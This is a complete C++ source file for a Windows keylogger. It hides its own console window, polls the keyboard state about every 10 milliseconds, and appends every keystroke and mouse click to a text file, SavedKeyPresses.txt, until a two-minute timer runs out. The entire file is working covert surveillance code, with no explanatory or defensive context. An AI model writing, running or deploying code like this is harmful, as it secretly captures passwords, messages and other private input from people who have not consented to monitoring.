#include <windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
#include <ctime>
#include <chrono>

void WriteToFile(LPCSTR character) {
	std::ofstream log;
	log.open("SavedKeyPresses.txt", std::fstream::app);
	log << character;
	log.close();
}

bool KeyIsListed(int iKey) {
	switch (iKey) {
	case VK_SPACE:
		//std::cout << " ";
		WriteToFile(" ");
		break;

	case VK_RETURN:
		//std::cout << "\n";
		WriteToFile("\n");
		break;
	case VK_SHIFT:
		//std::cout << " *Shift* ";
		WriteToFile(" *Shift* ");
		break;
	case VK_BACK:
		//std::cout << "\b";
		WriteToFile("\b");
		break;
	case VK_RBUTTON:
		//std::cout << " *rclick* ";
		WriteToFile(" *rclick* ");
		break;
	case VK_LBUTTON:
		//std::cout << " *lclick* ";
		WriteToFile(" *lclick* ");
		break;
	default: return false;
	}
	return true;
}

int main() {
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	std::chrono::steady_clock::time_point t1 = std::chrono::steady_clock::now();
	std::chrono::steady_clock::time_point t2;
	
	char key;
	while (TRUE) {
		Sleep(10);
		for (key = 8; key <= 190; key++) {
			t2 = std::chrono::steady_clock::now();
			std::chrono::duration<double> time_span = std::chrono::duration_cast<std::chrono::duration<double>>(t2 - t1);
			if (time_span.count() > 120) {
				return 0;
			}
			if (GetAsyncKeyState(key) == -32767) {
				if (!KeyIsListed(key)) {
					//std::cout << key;
					std::ofstream log;
					log.open("SavedKeyPresses.txt", std::fstream::app);
					log << key;
					log.close();
				}
			}
		}
	}
	return 0;
}